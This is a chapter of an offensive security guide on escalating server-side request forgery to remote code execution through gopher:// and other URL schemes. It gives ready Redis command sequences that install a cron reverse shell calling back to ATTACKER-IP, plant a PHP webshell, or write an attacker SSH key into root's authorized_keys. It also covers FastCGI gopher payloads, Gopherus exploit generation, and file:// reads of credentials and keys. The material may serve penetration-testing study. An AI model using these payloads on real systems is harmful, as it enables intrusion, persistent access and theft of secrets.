<section id="ch8">
  <div class="chapter-header" data-ch="08">
    <div class="ch-label">Chapter 08</div>
    <h2>Protocol Exploitation &amp; RCE Chains</h2>
    <p>When SSRF goes beyond HTTP — weaponizing gopher://, file://, and other schemes to achieve Remote Code Execution.</p>
  </div>

  <h3>8.1 The gopher:// Protocol</h3>
  <p>Gopher is a text-based TCP protocol predating HTTP. Its real power for SSRF exploitation: it lets you send arbitrary raw bytes to any TCP port. Unlike HTTP (which is constrained to HTTP request format), Gopher lets you speak Redis, MySQL, SMTP, FastCGI, or any other text-based protocol. This is how SSRF becomes RCE.</p>

  <pre><span class="c"># Gopher URL format:
# gopher://HOST:PORT/_ PAYLOAD
# The _ is a path separator; everything after _ is sent raw to the port</span>

gopher://127.0.0.1:6379/_PING   <span class="c"># Send PING command to Redis</span>
gopher://localhost:25/_EHLO example.com  <span class="c"># Talk to SMTP</span>

<span class="c"># Key: payload must be URL-encoded for transport,
# then the server decodes it and sends raw bytes to the service</span></pre>

  <h3>8.2 SSRF → Redis → RCE</h3>
  <p>Redis running on localhost with no authentication is a common configuration in Docker environments and legacy deployments. Redis allows writing arbitrary files via <code>CONFIG SET</code>. If you write to <code>/var/spool/cron/</code>, you get a cron-based reverse shell. If you write to the web root, you get a PHP webshell.</p>

  <span class="pre-label">Method 1: Redis → Cron Reverse Shell</span>
  <pre><span class="c"># Raw Redis commands to write a reverse shell cron job:</span>
FLUSHALL
SET 1 "\n\n* * * * * bash -i &gt;&amp; /dev/tcp/ATTACKER-IP/4444 0&gt;&amp;1\n\n"
CONFIG SET dir /var/spool/cron/crontabs
CONFIG SET dbfilename root
SAVE

<span class="c"># Encoded as Gopher payload (use Gopherus tool to generate):</span>
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A...

<span class="c"># Using Gopherus tool (easier):</span>
$ python gopherus.py --exploit redis
<span class="c"># Choose: Shell - Get shell
# Enter: Your listener IP and port
# Output: Ready-to-paste gopher URL</span></pre>

  <span class="pre-label">Method 2: Redis → PHP Webshell</span>
  <pre><span class="c"># Write a PHP webshell to the web root:</span>
FLUSHALL
SET 1 "&lt;?php system($_GET['cmd']); ?&gt;"
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SAVE

<span class="c"># Then access: http://target.com/shell.php?cmd=id</span></pre>

  <span class="pre-label">Method 3: Redis → SSH Authorized Keys</span>
  <pre><span class="c"># Write your SSH public key to root's authorized_keys:</span>
FLUSHALL
SET 1 "\n\nssh-rsa AAAA...YOUR_PUBLIC_KEY... attacker@kali\n\n"
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SAVE

<span class="c"># Then SSH in: ssh root@target.com -i your_private_key</span></pre>

  <h3>8.3 Using Gopherus (Essential Tool)</h3>
  <p>Gopherus is the go-to tool for generating gopher:// payloads for multiple internal services:</p>

  <pre><span class="c"># Install:</span>
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus &amp;&amp; pip install -r requirements.txt

<span class="c"># Available targets:</span>
python gopherus.py --exploit redis      <span class="c"># Redis RCE</span>
python gopherus.py --exploit mysql      <span class="c"># MySQL (needs creds)</span>
python gopherus.py --exploit postgresql <span class="c"># PostgreSQL</span>
python gopherus.py --exploit smtp       <span class="c"># Send email as internal user</span>
python gopherus.py --exploit fastcgi    <span class="c"># PHP-FPM → RCE</span>
python gopherus.py --exploit zabbix     <span class="c"># Zabbix RCE</span>
python gopherus.py --exploit memcached  <span class="c"># Memcached deserialization</span></pre>

  <h3>8.4 SSRF → FastCGI → RCE</h3>
  <p>PHP-FPM (FastCGI) is commonly bound to <code>127.0.0.1:9000</code>. If you can reach it via gopher://, you can execute arbitrary PHP:</p>

  <pre><span class="c"># FastCGI gopher payload (execute PHP code):</span>
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00
<span class="c"># (Full payload generated by Gopherus — too long to write manually)

# Execute: &lt;?php system('id'); ?&gt; 
# → Output: uid=33(www-data) gid=33(www-data)</span></pre>

  <h3>8.5 Other Protocol Exploits</h3>

  <table class="payload-table">
    <tr><th>Protocol</th><th>Target</th><th>Impact</th></tr>
    <tr><td>file://</td><td>Local filesystem</td><td>Read /etc/passwd, /proc/self/environ, app configs, SSH keys</td></tr>
    <tr><td>dict://</td><td>dict protocol / port scan</td><td>Port scanning, basic service interaction</td></tr>
    <tr><td>sftp://</td><td>SSH/SFTP servers</td><td>Connect to internal SFTP services</td></tr>
    <tr><td>ldap://</td><td>LDAP directory</td><td>Query Active Directory / LDAP servers</td></tr>
    <tr><td>ldaps://</td><td>LDAP over TLS</td><td>Same as above, encrypted</td></tr>
    <tr><td>jar://</td><td>Java ZIP fetch</td><td>Fetch remote ZIP and execute — code load primitive</td></tr>
    <tr><td>ftp://</td><td>FTP servers</td><td>Access internal FTP, sometimes credential disclosure</td></tr>
    <tr><td>netdoc://</td><td>Java only</td><td>File read in Java environments</td></tr>
    <tr><td>smtp://</td><td>Mail server</td><td>Send email as internal user via gopher chain</td></tr>
  </table>

  <h3>8.6 Assetnote Blind SSRF Chains</h3>
  <p>The assetnote/blind-ssrf-chains GitHub repo documents RCE chains specifically for blind SSRF. Key patterns:</p>

  <pre><span class="c"># Confluence → SSRF (via icon URL parameter)
# Artifactory → SSRF (via remote repository URL)
# Jenkins → SSRF (via update center URL or webhook)
# JIRA → SSRF (via icon URL in project settings)
# Kibana → SSRF (via timelion chartURL)
# Grafana → SSRF (via data source URL)

# Each acts as an "SSRF canary" — you blind-SSRF the app,
# which then SSRFs another internal service that OOBs to Collaborator</span></pre>

</section>

